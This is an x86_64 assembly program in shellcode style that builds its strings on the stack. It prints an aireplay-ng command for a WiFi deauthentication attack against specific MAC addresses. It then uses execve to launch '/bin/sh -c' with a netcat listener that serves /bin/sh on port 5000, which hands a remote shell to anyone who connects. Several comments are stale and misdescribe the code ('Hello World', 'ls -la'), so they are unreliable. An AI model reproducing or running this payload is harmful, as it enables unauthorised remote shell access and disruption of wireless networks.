;arg x86_64        rdi   rsi   rdx   r10   r8    r9    -

section	.text
    	global _start

_start:
	xor rbx, rbx
	jmp main

read:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 0   ; use the read syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret


write:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	xor rdi,rdi
	mov rax, 1   ; use the write syscall
	mov rdi, 1   ; write to stdout
	mov rsi, [rbp+24] ; use string "Hello World"
	mov rdx, [rbp+16]  ; write 12 characters
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret
	
main:
	
	push word 0x0A0D
	mov rsi, 'an0mon  '
	push rsi
	mov rsi, '93:61 wl'
	push rsi
	mov rsi, 'E:05:0F:'
	push rsi
	mov rsi, ' -c D4:A'
	push rsi
	mov rsi, '80:DC:23'
	push rsi
	mov rsi, '8:A3:78:'
	push rsi
	mov rsi, '000 -a 6'
	push rsi
	mov rsi, '-ng -0 1'
	push rsi
	mov rsi, 'aireplay'
	push rsi
	push rsp
	xor rdx,rdx
	add rdx,74
	push rdx
	call write

	push word 0x0A0D
	mov rsi, '********'
	push rsi
	push rsp
	mov r15, [rsp]
	xor rdx,rdx
	add rdx,8
	push rdx
	call read

	push r15
	xor rdx,rdx
	add rdx, 10
	push rdx
	call write


	xor rdx,rdx
	
	push rdx
	mov rax,'168.1.15'
	push rax
	mov rax,'/sh 192.'
	push rax
	mov rax,' -c /bin'
	push rax
	mov rax,' 5000 -k'
	push rax
	mov rax,'nc -l -p'
	push rax
	push rsp
	pop rbx

	push rdx
	mov rax,'/bin//sh'
	push rax
	push rsp
	pop rdi

	push rdx
	;mov rax,'-c'
	;push rax
	push word '-c'
	push rsp
	pop rsi


	push rdx ; push null
	push rbx ; 'ls -la'
	push rsi ; '-c'
	push rdi ; '/bin//sh'
	push rsp
	pop rsi  ; address of array of pointers to strings

	push 59  ; execve system call
	pop rax
	syscall





